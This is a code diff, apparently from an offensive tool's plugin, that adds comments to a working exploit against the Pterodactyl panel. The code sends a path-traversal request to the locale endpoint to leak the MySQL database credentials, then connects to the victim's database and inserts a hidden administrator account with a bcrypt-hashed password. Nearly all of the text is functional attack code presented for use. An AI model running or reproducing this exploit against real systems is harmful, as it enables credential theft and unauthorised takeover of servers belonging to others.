@@ -9,21 +9,26 @@ from requests.exceptions import RequestException
 from plugins.common import *
 
 def exploit(target_url):
+    # disable warnings
     warnings.filterwarnings("ignore", category=UserWarning)
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+    # prepare endpoint
     target_url = target_url.strip().rstrip('/') + '/'
     endpoint = f"{target_url}locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
 
     print(f"\n{gray}[{yellow}#{gray}] {white}Checking {yellow}{target_url}{white} for vuln...\n")
 
     try:
+        # request endpoint
         response = requests.get(endpoint, allow_redirects=True, timeout=5, verify=False)
 
+        # check if vulnerable
         if response.status_code == 200 and "pterodactyl" in response.text.lower():
             try:
                 raw_data = response.json()
                 data = raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"]
+
                 print(f"{gray}[{yellow}#{gray}] {green}Host is vulnerable!")
                 print(f"{gray}• {yellow}Host:     {white}{data['host']}")
                 print(f"{gray}• {yellow}Port:     {white}{data['port']}")
@@ -47,13 +52,18 @@ def exploit(target_url):
         return None
 
 def ptero(target_url):
-    if not (target_url.startswith('http://') or target_url.startswith('https://')): target_url = 'https://' + target_url
+    # ensure url starts with http/https
+    if not (target_url.startswith('http://') or target_url.startswith('https://')):
+        target_url = 'https://' + target_url
+
+    # attempt to exploit and get db credentials
     data = exploit(target_url)
     if not data:
         return
 
     print(f"{gray}[{yellow}#{gray}] {white}Attempting to create admin account...\n")
 
+    # prepare info
     email = "banana@us.gov"
     username = "banana"
     first_name = "Banana"
@@ -62,6 +72,7 @@ def ptero(target_url):
     uuid_str = str(uuid.uuid4())
     host_clean = str(target_url).replace('https://', '').replace('http://', '').replace('/', '')
 
+    # connect to database
     try:
         conn = mysql.connector.connect(
             host=host_clean,
@@ -75,8 +86,11 @@ def ptero(target_url):
         return
 
     cursor = conn.cursor()
+
+    # hash password with bcrypt
     hashed_pw = bcrypt.hashpw(password.encode(), bcrypt.gensalt(10)).decode()
 
+    # sql insert for admin account
     sql = """
     INSERT INTO users (
         external_id, uuid, username, email, name_first, name_last, password,
@@ -91,6 +105,8 @@ def ptero(target_url):
 
     try:
         remember_token = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
+
+        # execute insertion
         cursor.execute(sql, (
             uuid_str,
             username,
